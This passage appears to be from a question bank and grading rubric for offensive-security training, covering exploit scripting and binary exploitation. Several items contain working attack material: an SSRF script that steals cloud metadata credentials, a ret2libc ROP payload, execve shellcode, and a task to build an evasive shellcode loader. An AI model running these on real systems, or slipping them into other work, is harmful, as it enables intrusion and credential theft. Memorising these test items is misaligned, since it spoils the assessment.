    gaps: [
      { if_missing: "nf-minus-3", gap: "Unfamiliar with awk field operations — study awk built-in variables and field processing" },
      { if_missing: "limitations", gap: "Does not consider log format variations — practice parsing logs with inconsistent formats" },
    ],
  },
},

{
  competencyId: "scripting",
  subTopic: "exploit-automation",
  questionType: "trace_explain",
  difficulty: 3,
  questionText:
    `Trace the execution of this Python exploit script and explain each step:\n\n\`\`\`python\nimport requests\nimport base64\n\ndef exploit_ssrf(target, internal_url):\n    # Step 1: Encode the internal URL\n    encoded = base64.b64encode(internal_url.encode()).decode()\n    \n    # Step 2: Craft the SSRF payload\n    payload = f"http://127.0.0.1/fetch?url=data://text/plain;base64,{encoded}"\n    \n    # Step 3: Trigger the SSRF\n    r = requests.get(f"{target}/proxy?url={payload}")\n    \n    # Step 4: Extract the response\n    return r.text\n\n# Usage\nresult = exploit_ssrf("http://vulnerable.com", "http://169.254.169.254/latest/meta-data/iam/security-credentials/")\nprint(result)\n\`\`\`\n\nWhat vulnerability is being exploited? What is the target of the SSRF (169.254.169.254)? Why does the attacker use base64 encoding and the data:// scheme? What cloud credentials might be exposed?`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "ssrf-explained", description: "Identifies SSRF — the server is tricked into making requests to internal/cloud endpoints", points: 2, keywords: ["SSRF", "Server-Side Request Forgery", "internal", "proxy", "server makes request"], check: "Student correctly identifies the SSRF vulnerability" },
      { id: "imds-target", description: "Identifies 169.254.169.254 as the AWS Instance Metadata Service (IMDS)", points: 2, keywords: ["IMDS", "metadata", "169.254.169.254", "AWS", "instance metadata", "link-local"], check: "Student identifies the IMDS as the target" },
      { id: "encoding-reason", description: "Explains base64 + data:// bypasses URL validation/filtering that blocks direct internal IPs", points: 2, keywords: ["bypass", "filter", "validation", "base64", "data://", "encode", "evasion"], check: "Student explains the encoding as a filter bypass technique" },
      { id: "credential-exposure", description: "Explains IAM role credentials (access key, secret key, session token) would be exposed", points: 2, keywords: ["IAM", "credentials", "access key", "secret key", "session token", "role"], check: "Student identifies the specific credentials at risk" },
    ],
    gaps: [
      { if_missing: "imds-target", gap: "Does not know the cloud metadata service — study AWS/GCP/Azure IMDS and its security implications" },
      { if_missing: "encoding-reason", gap: "Missing knowledge of SSRF filter bypass — study URL encoding and scheme-based evasion" },
    ],
  },
},

{
  competencyId: "scripting",
  subTopic: "port-scanner",
  questionType: "fix_code",
  difficulty: 3,
  questionText:
    `This port scanner is slow and unreliable. Fix the performance and correctness issues:\n\n\`\`\`python\nimport socket\n\ndef scan_ports(target, start=1, end=65535):\n    open_ports = []\n    for port in range(start, end + 1):\n        try:\n            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            s.connect((target, port))\n            open_ports.append(port)\n            s.close()\n        except:\n            pass\n    return open_ports\n\nresults = scan_ports("10.10.10.50")\nfor port in results:\n    print(f"Port {port} is open")\n\`\`\`\n\nFix: the missing timeout (hangs on filtered ports), the sequential scanning (too slow), the bare except clause, and add service banner grabbing. Use threading or asyncio for concurrency.`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "timeout", description: "Adds socket timeout (settimeout) to prevent hanging on filtered ports", points: 2, keywords: ["timeout", "settimeout", "1", "0.5", "filtered", "hanging"], check: "Student adds a socket timeout" },
      { id: "concurrency", description: "Adds threading, multiprocessing, or asyncio for parallel scanning", points: 2, keywords: ["threading", "Thread", "asyncio", "concurrent", "parallel", "ThreadPoolExecutor"], check: "Student implements concurrent scanning" },
      { id: "error-handling", description: "Replaces bare except with specific exceptions (ConnectionRefusedError, socket.timeout)", points: 2, keywords: ["ConnectionRefusedError", "socket.timeout", "specific exception", "bare except"], check: "Student handles specific exceptions properly" },
      { id: "banner-grab", description: "Adds banner grabbing (recv after connect) to identify services", points: 2, keywords: ["banner", "recv", "grab", "service", "identification", "version"], check: "Student adds service banner grabbing" },
    ],
    gaps: [
      { if_missing: "timeout", gap: "Does not handle socket timeouts — study TCP connection behavior for filtered ports" },
      { if_missing: "concurrency", gap: "Cannot implement concurrent scanning — study Python threading or asyncio" },
    ],
  },
},

{
  competencyId: "scripting",
  subTopic: "payload-generation",
  questionType: "fix_code",
  difficulty: 3,
  questionText:
    `This payload encoder is supposed to evade basic string detection, but it has bugs and its evasion is weak:\n\n\`\`\`python\nimport base64\nimport random\n\ndef encode_payload(shellcode):\n    # XOR with single byte key\n    key = random.randint(1, 255)\n    encoded = bytes([b ^ key for b in shellcode])\n    \n    # Base64 encode\n    b64 = base64.b64encode(encoded)\n    \n    # Generate decoder stub\n    decoder = f\"\"\"\nimport base64\nencoded = {b64}\ndecoded = base64.b64decode(encoded)\nkey = {key}\nshellcode = bytes([b ^ key for b in decoded])\nexec(shellcode)\n\"\"\"\n    return decoder\n\`\`\`\n\nIdentify the bugs (exec cannot run raw shellcode). Fix the code to properly execute shellcode using ctypes. Explain why single-byte XOR is trivially breakable, and suggest a stronger encoding scheme.`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "exec-bug", description: "Identifies exec() runs Python code, not raw shellcode — needs ctypes or mmap for native execution", points: 2, keywords: ["exec", "Python code", "ctypes", "mmap", "native", "shellcode execution"], check: "Student identifies the fundamental bug: exec cannot run shellcode" },
      { id: "ctypes-fix", description: "Provides a ctypes-based shellcode loader using VirtualAlloc or mmap", points: 2, keywords: ["ctypes", "VirtualAlloc", "mmap", "PROT_EXEC", "windll", "cast", "CFUNCTYPE"], check: "Student implements proper shellcode execution via ctypes" },
      { id: "xor-weakness", description: "Explains single-byte XOR has only 255 possible keys, breakable by brute force or frequency analysis", points: 2, keywords: ["255 keys", "brute force", "frequency analysis", "trivial", "single byte", "weak"], check: "Student explains why single-byte XOR is trivially weak" },
      { id: "stronger-encoding", description: "Suggests multi-byte XOR, AES encryption, or polymorphic encoding as improvements", points: 2, keywords: ["multi-byte", "AES", "polymorphic", "rolling XOR", "stronger", "metamorphic"], check: "Student proposes a stronger encoding alternative" },
    ],
    gaps: [
      { if_missing: "exec-bug", gap: "Confused about Python exec vs native code execution — study how shellcode runs at the OS level" },
      { if_missing: "ctypes-fix", gap: "Cannot use ctypes for native code — study Python ctypes for low-level system interaction" },
    ],
  },
},

{
  competencyId: "scripting",
  subTopic: "api-interaction",
  questionType: "fix_code",
  difficulty: 3,
  questionText:
    `This script automates Shodan queries but has several issues:\n\n\`\`\`python\nimport requests\nimport json\n\nSHODAN_KEY = "YOUR_API_KEY_HERE"  # hardcoded\n\ndef search_shodan(query):\n    url = f"https://api.shodan.io/shodan/host/search?key={SHODAN_KEY}&query={query}"\n    r = requests.get(url)\n    data = r.json()\n    \n    for result in data['matches']:\n        print(f"{result['ip_str']}:{result['port']} - {result['data'][:100]}")\n    \n    return data\n\ndef bulk_scan(targets):\n    results = []\n    for target in targets:\n        r = requests.get(f"https://api.shodan.io/shodan/host/{target}?key={SHODAN_KEY}")\n        results.append(r.json())\n    return results\n\`\`\`\n\nFix: the hardcoded API key, the missing error handling, the rate limiting issues, the URL parameter injection risk, and the lack of output formatting. Rewrite to be production-quality.`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "key-management", description: "Moves API key to environment variable or config file, not hardcoded", points: 2, keywords: ["environment", "os.environ", "config", "env var", "not hardcoded", ".env"], check: "Student moves the API key out of source code" },
      { id: "error-handling", description: "Adds HTTP status code checking, JSON parse error handling, and API error responses", points: 2, keywords: ["status code", "try/except", "HTTPError", "raise_for_status", "JSON error"], check: "Student adds comprehensive error handling" },
      { id: "rate-limiting", description: "Adds rate limiting/delays between API calls to respect API quotas", points: 2, keywords: ["rate limit", "sleep", "delay", "quota", "throttle", "retry"], check: "Student implements rate limiting" },
      { id: "url-encoding", description: "Uses requests params dict instead of f-string URL construction to prevent injection", points: 2, keywords: ["params", "dict", "urlencode", "injection", "not f-string", "safe"], check: "Student uses proper URL parameter encoding" },
    ],
    gaps: [
      { if_missing: "key-management", gap: "Hardcodes secrets in source code — study secret management and environment variables" },
      { if_missing: "rate-limiting", gap: "Does not handle API rate limits — study API interaction best practices" },
    ],
  },
},

{
  competencyId: "scripting",
  subTopic: "automation-framework",
  questionType: "design_solution",
  difficulty: 4,
  questionText:
    `Design a Python-based reconnaissance automation framework that:\n\n1. Takes a target domain as input\n2. Runs subdomain enumeration, port scanning, and service fingerprinting in parallel\n3. Stores results in a structured format (JSON/SQLite)\n4. Generates an HTML report\n5. Supports plugin modules for adding new recon techniques\n\nProvide the class structure, explain the concurrency model, describe the plugin interface, and show how results from different modules are correlated. Include error handling and resumability (can continue after interruption).`,
  rubric: {
    maxScore: 9,
    criteria: [
      { id: "architecture", description: "Provides a clean class hierarchy: Scanner base class, concrete implementations, orchestrator", points: 2, keywords: ["class", "Scanner", "base", "inheritance", "orchestrator", "module"], check: "Student designs a coherent class architecture" },
      { id: "concurrency", description: "Uses asyncio or ThreadPoolExecutor with proper synchronization for parallel module execution", points: 2, keywords: ["asyncio", "ThreadPoolExecutor", "parallel", "concurrent", "synchronization", "gather"], check: "Student implements proper concurrency" },
      { id: "plugin-interface", description: "Defines a plugin interface with register/discover mechanism and standardized output format", points: 3, keywords: ["plugin", "interface", "register", "abstract", "protocol", "standardized", "ABC"], check: "Student defines a clean plugin interface" },
      { id: "resumability", description: "Implements checkpoint/resume by persisting intermediate results and tracking completion state", points: 2, keywords: ["resume", "checkpoint", "persist", "state", "interrupted", "continue"], check: "Student designs resumability into the framework" },
    ],
    gaps: [
      { if_missing: "plugin-interface", gap: "Cannot design extensible software — study plugin architectures and interface design patterns" },
      { if_missing: "concurrency", gap: "Weak Python concurrency skills — study asyncio and ThreadPoolExecutor patterns" },
    ],
  },
},

{
  competencyId: "scripting",
  subTopic: "python-vs-bash",
  questionType: "compare_contrast",
  difficulty: 4,
  questionText:
    `Compare Python and Bash for these offensive security tasks:\n\n1. Quick one-liner to extract IPs from a log file\n2. A multi-stage exploit chain with HTTP requests, payload encoding, and socket connections\n3. System enumeration script that checks permissions, SUID binaries, cron jobs, and network config\n4. A persistent C2 implant with encryption and error handling\n\nFor each task: Which language is better suited and why? What are the tradeoffs in terms of portability, detection surface, development speed, and capability? When would you use one inside the other (e.g., Python calling bash, or bash wrapping Python)?`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "right-tool", description: "Correctly assigns: bash for 1 and 3, Python for 2 and 4, with reasoning", points: 2, keywords: ["bash", "Python", "one-liner", "complex", "right tool", "suited"], check: "Student matches the right language to each task with reasoning" },
      { id: "portability", description: "Discusses bash availability on targets vs. Python version/dependency issues", points: 2, keywords: ["portability", "available", "installed", "dependencies", "version", "target system"], check: "Student evaluates portability tradeoffs" },
      { id: "detection", description: "Compares detection surfaces: bash is native, Python scripts more suspicious, compiled vs interpreted", points: 2, keywords: ["detection", "native", "suspicious", "LOLBins", "script", "compiled"], check: "Student compares detection characteristics" },
      { id: "interop", description: "Gives concrete examples of using Python inside bash or bash inside Python", points: 2, keywords: ["subprocess", "os.system", "embed", "wrapper", "pipe", "interop"], check: "Student demonstrates understanding of language interoperability" },
    ],
    gaps: [
      { if_missing: "right-tool", gap: "Cannot select appropriate scripting language for the task — study language strengths in offensive contexts" },
      { if_missing: "detection", gap: "Does not consider detection surface when choosing tools — study host-based detection of scripts" },
    ],
  },
},

{
  competencyId: "scripting",
  subTopic: "tool-development",
  questionType: "compare_contrast",
  difficulty: 5,
  questionText:
    `You need to develop a custom tool for a red team engagement. Compare these development approaches:\n\n1. Pure Python script\n2. Python compiled with PyInstaller/Nuitka\n3. Go binary\n4. C/C++ binary\n5. PowerShell script\n\nEvaluate each on: compilation/deployment complexity, cross-platform support, runtime dependencies, AV/EDR evasion characteristics, reverse engineering difficulty, and syscall-level control. Which would you choose for: (a) a cross-platform implant, (b) a Windows-only credential dumper, (c) a quick-and-dirty exploit, (d) a long-term persistent backdoor?`,
  rubric: {
    maxScore: 10,
    criteria: [
      { id: "deployment", description: "Accurately compares deployment: Python needs interpreter, Go/C produce static binaries, PowerShell is native", points: 2, keywords: ["static binary", "interpreter", "dependency", "native", "deployment", "single file"], check: "Student accurately compares deployment requirements" },
      { id: "evasion-comparison", description: "Compares AV/EDR characteristics: compiled binaries harder to analyze, Python/PS easily deobfuscated, Go binaries large but opaque", points: 2, keywords: ["AV", "EDR", "evasion", "detection", "signature", "behavior", "opaque"], check: "Student compares detection/evasion characteristics" },
      { id: "syscall-control", description: "Notes C/C++ provide direct syscall access, Go has runtime overhead, Python/PS require FFI", points: 2, keywords: ["syscall", "direct", "FFI", "ctypes", "runtime", "overhead", "control"], check: "Student evaluates syscall-level control per language" },
      { id: "scenario-choices", description: "Makes justified choices for each scenario: Go for cross-platform, C for credential dumper, Python for quick exploit, C/Go for backdoor", points: 2, keywords: ["cross-platform", "Go", "credential", "C", "quick", "Python", "backdoor"], check: "Student makes justified per-scenario tool choices" },
      { id: "re-difficulty", description: "Compares reverse engineering difficulty: stripped C is hardest, Python/PS trivial, Go somewhat hard due to runtime", points: 2, keywords: ["reverse engineering", "stripped", "decompile", "trivial", "runtime", "symbols"], check: "Student evaluates reverse engineering difficulty per language" },
    ],
    gaps: [
      { if_missing: "evasion-comparison", gap: "Cannot evaluate tool evasion characteristics — study how different languages interact with AV/EDR" },
      { if_missing: "syscall-control", gap: "Missing understanding of syscall-level control per language — study FFI and direct syscall techniques" },
    ],
  },
},

{
  competencyId: "scripting",
  subTopic: "regex-parsing",
  questionType: "predict_output",
  difficulty: 2,
  questionText:
    `Predict the output of each Python regex operation and explain what each pattern matches:\n\n\`\`\`python\nimport re\n\nlog = "Failed password for root from 192.168.1.50 port 22 ssh2"\n\n# Pattern A\nprint(re.findall(r'\\d+\\.\\d+\\.\\d+\\.\\d+', log))\n\n# Pattern B\nprint(re.findall(r'for (\\w+) from', log))\n\n# Pattern C\nprint(re.search(r'port (\\d+)', log).group(1))\n\n# Pattern D - intended to match IPs but has a bug\nprint(re.findall(r'\\d{1,3}.\\d{1,3}.\\d{1,3}.\\d{1,3}', log))\n\`\`\`\n\nExplain: What is the difference between \`findall\` and \`search\`? Why does Pattern D have a bug despite producing the same output here? What input would expose the bug?`,
  rubric: {
    maxScore: 7,
    criteria: [
      { id: "output-prediction", description: "Correctly predicts all four outputs", points: 2, keywords: ["192.168.1.50", "root", "22", "findall", "group"], check: "Student correctly predicts the output of each pattern" },
      { id: "findall-vs-search", description: "Explains findall returns all matches as list, search returns first match object", points: 2, keywords: ["findall", "all matches", "list", "search", "first match", "match object"], check: "Student differentiates findall and search" },
      { id: "dot-bug", description: "Identifies Pattern D uses unescaped dot (matches any char), which could match non-IP strings like 192x168x1x50", points: 2, keywords: ["unescaped dot", "any character", "escape", "\\\\.", "bug", "false match"], check: "Student identifies the unescaped dot as a bug" },
      { id: "capture-groups", description: "Explains parentheses create capture groups, and findall returns only captured groups when present", points: 1, keywords: ["capture group", "parentheses", "group", "extracted", "captured"], check: "Student explains capture group behavior" },
    ],
    gaps: [
      { if_missing: "dot-bug", gap: "Does not understand regex special characters — study metacharacter escaping in regex" },
      { if_missing: "findall-vs-search", gap: "Confused about regex API — practice Python re module methods" },
    ],
  },
},

{
  competencyId: "scripting",
  subTopic: "file-operations",
  questionType: "design_solution",
  difficulty: 5,
  questionText:
    `Design a Python-based data exfiltration detection tool that monitors a directory for suspicious file operations in real time. The tool should:\n\n1. Watch for files being copied, renamed, compressed, or moved to removable media\n2. Detect rapid bulk file access patterns (reading many files in quick succession)\n3. Alert on files being encrypted in place (entropy change detection)\n4. Log all events with timestamps, process info, and user context\n5. Produce alerts when thresholds are exceeded\n\nAddress: How do you monitor filesystem events efficiently (not polling)? How do you calculate file entropy? How do you distinguish legitimate backup operations from exfiltration? What false-positive reduction strategies would you implement?`,
  rubric: {
    maxScore: 10,
    criteria: [
      { id: "fs-monitoring", description: "Uses inotify (Linux) or watchdog/ReadDirectoryChangesW (Windows) for event-driven monitoring", points: 2, keywords: ["inotify", "watchdog", "ReadDirectoryChangesW", "event-driven", "filesystem events", "not polling"], check: "Student selects an efficient event-driven monitoring approach" },
      { id: "entropy-detection", description: "Implements Shannon entropy calculation to detect encryption (high entropy = encrypted/compressed)", points: 2, keywords: ["Shannon entropy", "entropy", "encrypted", "high entropy", "calculate", "bytes"], check: "Student describes entropy-based encryption detection" },
      { id: "rate-detection", description: "Implements sliding window or token bucket for detecting rapid bulk access patterns", points: 2, keywords: ["sliding window", "rate", "threshold", "bulk", "rapid", "time window", "count"], check: "Student implements rate-based anomaly detection" },
      { id: "false-positive-reduction", description: "Addresses false positives: whitelisting known processes, learning baseline, time-of-day awareness", points: 2, keywords: ["whitelist", "baseline", "false positive", "legitimate", "exclude", "known process"], check: "Student implements false-positive reduction strategies" },
      { id: "process-context", description: "Captures process information (PID, executable path, user) associated with each file operation", points: 2, keywords: ["process", "PID", "executable", "user", "context", "who", "psutil"], check: "Student enriches events with process context" },
    ],
    gaps: [
      { if_missing: "fs-monitoring", gap: "Does not know efficient filesystem monitoring — study inotify and platform-specific FS event APIs" },
      { if_missing: "entropy-detection", gap: "Missing entropy analysis for ransomware detection — study Shannon entropy and its forensic applications" },
    ],
  },
},

// --- binexp (Binary exploitation) ---

{
  competencyId: "binexp",
  subTopic: "stack-overflow",
  questionType: "predict_output",
  difficulty: 1,
  questionText:
    `Consider this vulnerable C program compiled without stack protections (\`-fno-stack-protector -z execstack\`):\n\n\`\`\`c\n#include <stdio.h>\n#include <string.h>\n\nvoid secret() {\n    printf("You win!\\n");\n}\n\nvoid vulnerable(char *input) {\n    char buf[64];\n    strcpy(buf, input);\n    printf("You entered: %s\\n", buf);\n}\n\nint main(int argc, char *argv[]) {\n    vulnerable(argv[1]);\n    return 0;\n}\n\`\`\`\n\nDraw the stack layout during \`vulnerable()\`. What happens if the input is longer than 64 bytes? How many bytes of padding are needed before overwriting the return address (assume x86-64, 8-byte alignment, 8-byte saved RBP)? How would you redirect execution to \`secret()\`?`,
  rubric: {
    maxScore: 7,
    criteria: [
      { id: "stack-layout", description: "Correctly draws: buf[64] | saved RBP (8 bytes) | return address (8 bytes)", points: 2, keywords: ["buf", "saved RBP", "return address", "stack frame", "layout", "grows down"], check: "Student draws the correct stack layout" },
      { id: "overflow-effect", description: "Explains overflow overwrites saved RBP and return address, causing crash or code redirection", points: 2, keywords: ["overwrite", "return address", "crash", "segfault", "redirect", "control flow"], check: "Student explains the overflow effect on the stack" },
      { id: "padding", description: "Calculates 64 bytes of buffer + 8 bytes saved RBP = 72 bytes before the return address", points: 2, keywords: ["72", "64 + 8", "padding", "offset", "before return address"], check: "Student correctly calculates the offset to the return address" },
      { id: "exploit", description: "Describes writing secret()'s address at offset 72 in the input to redirect execution", points: 1, keywords: ["secret", "address", "overwrite", "redirect", "little-endian", "payload"], check: "Student describes how to redirect to secret()" },
    ],
    gaps: [
      { if_missing: "stack-layout", gap: "Does not understand stack frame layout — study x86-64 calling conventions and stack structure" },
      { if_missing: "padding", gap: "Cannot calculate buffer overflow offsets — practice with GDB and pattern generation" },
    ],
  },
},

{
  competencyId: "binexp",
  subTopic: "format-string",
  questionType: "predict_output",
  difficulty: 2,
  questionText:
    `This program has a format string vulnerability:\n\n\`\`\`c\n#include <stdio.h>\n\nint main() {\n    char buf[256];\n    int secret = 0x41414141;\n    \n    printf("Enter your name: ");\n    fgets(buf, sizeof(buf), stdin);\n    \n    printf("Hello, ");\n    printf(buf);  // vulnerable!\n    \n    printf("\\nsecret = 0x%08x\\n", secret);\n    return 0;\n}\n\`\`\`\n\nIf the user inputs \`%x.%x.%x.%x.%x.%x\`, what will be printed and why? How would an attacker use \`%n\` to modify the \`secret\` variable? What is the difference between \`%p\`, \`%x\`, and \`%n\` in a format string attack?`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "stack-leak", description: "Explains %x reads values from the stack above the format string, leaking stack contents", points: 2, keywords: ["stack", "leak", "%x", "values", "above", "arguments", "stack contents"], check: "Student explains how %x reads stack values" },
      { id: "format-specifiers", description: "Differentiates %p (pointer address), %x (hex value), %n (write count to address)", points: 2, keywords: ["%p", "%x", "%n", "pointer", "hex", "write", "count"], check: "Student correctly differentiates the format specifiers" },
      { id: "write-primitive", description: "Explains %n writes the number of bytes printed so far to the address pointed to by the next argument", points: 2, keywords: ["%n", "write", "bytes printed", "address", "arbitrary write", "count"], check: "Student explains the %n write primitive" },
      { id: "direct-parameter", description: "Mentions direct parameter access (%N$x) for targeting specific stack positions", points: 2, keywords: ["direct parameter", "%N$", "position", "specific", "offset", "dollar"], check: "Student knows about direct parameter access syntax" },
    ],
    gaps: [
      { if_missing: "write-primitive", gap: "Does not understand format string write primitive — study %n and its exploitation" },
      { if_missing: "stack-leak", gap: "Cannot trace format string stack reads — practice with format string challenges" },
    ],
  },
},

{
  competencyId: "binexp",
  subTopic: "nx-bit",
  questionType: "spot_vuln",
  difficulty: 2,
  questionText:
    `An exploit developer writes shellcode to a stack buffer and jumps to it, but the exploit crashes on a modern system. They check the binary:\n\n\`\`\`bash\n$ checksec --file=target\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE\n\`\`\`\n\nExplain each protection listed by checksec. Why does the shellcode crash despite no stack canary? What exploit technique bypasses NX while still achieving code execution? Why does "No PIE" actually help the attacker?`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "nx-explained", description: "Explains NX marks the stack as non-executable, so shellcode on the stack causes SIGSEGV", points: 2, keywords: ["NX", "non-executable", "DEP", "stack", "SIGSEGV", "execute", "data"], check: "Student explains NX prevents shellcode execution on the stack" },
      { id: "rop-bypass", description: "Describes ROP (Return Oriented Programming) as the NX bypass — reuse existing code gadgets", points: 2, keywords: ["ROP", "return-oriented", "gadgets", "existing code", "code reuse", "bypass NX"], check: "Student identifies ROP as the NX bypass technique" },
      { id: "no-pie-helps", description: "Explains No PIE means binary is loaded at fixed address, making gadget addresses predictable", points: 2, keywords: ["PIE", "fixed address", "predictable", "gadget address", "no ASLR for binary", "known base"], check: "Student explains why No PIE helps the attacker" },
      { id: "relro-explained", description: "Explains Partial RELRO leaves GOT writable, enabling GOT overwrite attacks", points: 2, keywords: ["RELRO", "GOT", "writable", "overwrite", "PLT", "lazy binding"], check: "Student explains RELRO and its impact on GOT overwrite" },
    ],
    gaps: [
      { if_missing: "nx-explained", gap: "Does not understand NX/DEP — study memory page permissions and hardware enforcement" },
      { if_missing: "rop-bypass", gap: "Missing ROP knowledge — study return-oriented programming as the fundamental NX bypass" },
    ],
  },
},

{
  competencyId: "binexp",
  subTopic: "canary-bypass",
  questionType: "spot_vuln",
  difficulty: 2,
  questionText:
    `A binary has stack canaries enabled but is still exploitable. The relevant code:\n\n\`\`\`c\nvoid process_request(int fd) {\n    char buf[128];\n    char logfile[64];\n    \n    read(fd, buf, 256);  // overflow!\n    snprintf(logfile, sizeof(logfile), "/var/log/%s.log", buf);\n    \n    int log_fd = open(logfile, O_WRONLY | O_CREAT, 0644);\n    write(log_fd, buf, strlen(buf));\n    close(log_fd);\n}\n\`\`\`\n\nThe stack canary protects the return address. But the overflow of \`buf\` can overwrite \`logfile\` first. Explain: What can the attacker do by controlling the \`logfile\` path? Why doesn't the canary prevent this? What other exploitation primitive does this create?`,
  rubric: {
    maxScore: 7,
    criteria: [
      { id: "variable-order", description: "Explains buf and logfile are adjacent on the stack — overflowing buf overwrites logfile before hitting the canary", points: 2, keywords: ["adjacent", "stack", "before canary", "local variables", "overflow order"], check: "Student understands the stack variable layout relative to the canary" },
      { id: "path-control", description: "Explains controlling logfile path allows arbitrary file write (e.g., /etc/cron.d/pwn, SSH authorized_keys)", points: 2, keywords: ["arbitrary file write", "path", "cron", "authorized_keys", "overwrite", "file"], check: "Student identifies the arbitrary file write primitive" },
      { id: "canary-irrelevant", description: "Notes the canary is irrelevant because the useful primitive (file write) happens before function return", points: 2, keywords: ["before return", "canary", "irrelevant", "not triggered", "side effect"], check: "Student explains why the canary does not prevent this attack" },
      { id: "exploitation", description: "Describes a concrete exploitation path: write a cron job or SSH key for code execution", points: 1, keywords: ["cron", "SSH key", "code execution", "persistence", "write file"], check: "Student provides a concrete exploitation path" },
    ],
    gaps: [
      { if_missing: "variable-order", gap: "Does not understand stack variable layout — study how local variables are arranged in memory" },
      { if_missing: "path-control", gap: "Cannot identify non-control-flow exploitation — study data-only attacks and arbitrary file write" },
    ],
  },
},

{
  competencyId: "binexp",
  subTopic: "ret2libc",
  questionType: "trace_explain",
  difficulty: 3,
  questionText:
    `An attacker exploits a buffer overflow on a binary with NX enabled but no PIE and no ASLR. They construct this payload:\n\n\`\`\`python\nfrom struct import pack\n\noffset = 72\npoprdi = 0x401234        # pop rdi; ret gadget\nbinsh  = 0x7ffff7b98123  # address of "/bin/sh" in libc\nsystem = 0x7ffff7a52456  # address of system() in libc\nret    = 0x40101a        # ret gadget (for stack alignment)\n\npayload = b'A' * offset\npayload += pack('<Q', ret)      # stack alignment\npayload += pack('<Q', poprdi)   # pop rdi; ret\npayload += pack('<Q', binsh)    # argument: "/bin/sh"\npayload += pack('<Q', system)   # call system()\n\`\`\`\n\nTrace the execution of this ROP chain step by step. Why is the initial \`ret\` gadget needed for alignment? What happens at each gadget? Why does this work despite NX being enabled?`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "rop-flow", description: "Traces: overflow -> ret (align) -> pop rdi (loads /bin/sh into rdi) -> system() executes", points: 2, keywords: ["overflow", "pop rdi", "rdi", "/bin/sh", "system", "execute", "chain"], check: "Student correctly traces each step of the ROP chain" },
      { id: "alignment", description: "Explains the ret gadget aligns RSP to 16-byte boundary required by system() (movaps instruction)", points: 2, keywords: ["alignment", "16-byte", "RSP", "movaps", "SIGSEGV", "stack alignment"], check: "Student explains the stack alignment requirement" },
      { id: "calling-convention", description: "Explains x86-64 calling convention: first argument in RDI, which is why pop rdi is used", points: 2, keywords: ["calling convention", "RDI", "first argument", "System V", "ABI", "x86-64"], check: "Student connects the ROP chain to the calling convention" },
      { id: "nx-bypass", description: "Explains this bypasses NX because it reuses existing executable code (libc), not injected shellcode", points: 2, keywords: ["existing code", "libc", "executable", "code reuse", "not injected", "NX bypass"], check: "Student explains why ROP bypasses NX" },
    ],
    gaps: [
      { if_missing: "alignment", gap: "Does not understand stack alignment — study x86-64 ABI alignment requirements" },
      { if_missing: "calling-convention", gap: "Missing calling convention knowledge — review System V AMD64 ABI" },
    ],
  },
},

{
  competencyId: "binexp",
  subTopic: "got-overwrite",
  questionType: "trace_explain",
  difficulty: 3,
  questionText:
    `A binary has Partial RELRO and uses lazy binding. The attacker's plan is to overwrite the GOT entry for \`printf\` with the address of \`system\`.\n\n\`\`\`c\n// The binary calls:\nprintf(user_input);  // format string vulnerability\n// Later calls:\nprintf("/bin/sh");   // attacker wants this to become system("/bin/sh")\n\`\`\`\n\nExplain: What is the GOT and PLT? How does lazy binding work? How does the attacker use the format string vulnerability to overwrite the GOT? Why does Partial RELRO allow this but Full RELRO would not?`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "got-plt", description: "Explains GOT stores resolved function addresses, PLT provides stub code that jumps through GOT", points: 2, keywords: ["GOT", "Global Offset Table", "PLT", "Procedure Linkage Table", "resolved address", "stub"], check: "Student correctly explains GOT and PLT relationship" },
      { id: "lazy-binding", description: "Explains lazy binding: first call goes through PLT to dynamic linker, which resolves and writes to GOT", points: 2, keywords: ["lazy binding", "dynamic linker", "resolve", "first call", "ld.so", "dl_runtime_resolve"], check: "Student explains the lazy binding mechanism" },
      { id: "format-write", description: "Explains using %n to write system()'s address to printf's GOT entry", points: 2, keywords: ["%n", "write", "GOT entry", "printf", "system", "overwrite"], check: "Student traces the GOT overwrite via format string" },
      { id: "relro-difference", description: "Explains Full RELRO resolves all symbols at load time and makes GOT read-only", points: 2, keywords: ["Full RELRO", "read-only", "load time", "all resolved", "mprotect", "BIND_NOW"], check: "Student differentiates Partial and Full RELRO" },
    ],
    gaps: [
      { if_missing: "got-plt", gap: "Does not understand GOT/PLT — study dynamic linking and ELF binary structure" },
      { if_missing: "lazy-binding", gap: "Missing lazy binding knowledge — study the dynamic linker resolution process" },
    ],
  },
},

{
  competencyId: "binexp",
  subTopic: "shellcoding",
  questionType: "trace_explain",
  difficulty: 3,
  questionText:
    `Analyze this x86-64 Linux shellcode:\n\n\`\`\`asm\n; execve("/bin/sh", NULL, NULL)\nxor    rsi, rsi          ; argv = NULL\npush   rsi               ; push null terminator\nmov    rdi, 0x68732f6e69622f ; "/bin/sh" in little-endian\npush   rdi               ; push "/bin/sh" onto stack\nmov    rdi, rsp           ; rdi = pointer to "/bin/sh"\nxor    rdx, rdx          ; envp = NULL\nmov    al, 0x3b          ; syscall number for execve (59)\nsyscall\n\`\`\`\n\nTrace each instruction and explain why specific techniques are used:\n- Why \`xor rsi, rsi\` instead of \`mov rsi, 0\`?\n- Why is the string pushed onto the stack instead of stored in the data section?\n- Why \`mov al, 0x3b\` instead of \`mov rax, 0x3b\`?\n- What constraint is the shellcode writer avoiding?`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "null-byte-avoidance", description: "Explains all techniques avoid null bytes (0x00) which would terminate string-based injection", points: 3, keywords: ["null byte", "0x00", "terminator", "strcpy", "avoid", "bad character"], check: "Student identifies null byte avoidance as the driving constraint" },
      { id: "xor-zeroing", description: "Explains xor reg, reg produces zero without encoding a null byte in the instruction", points: 2, keywords: ["xor", "zero", "no null", "self-XOR", "clear register"], check: "Student explains why XOR is used for zeroing" },
      { id: "stack-string", description: "Explains pushing string onto stack avoids null-terminated string literal in the code section", points: 2, keywords: ["stack", "push", "no data section", "position independent", "self-contained"], check: "Student explains the stack-based string technique" },
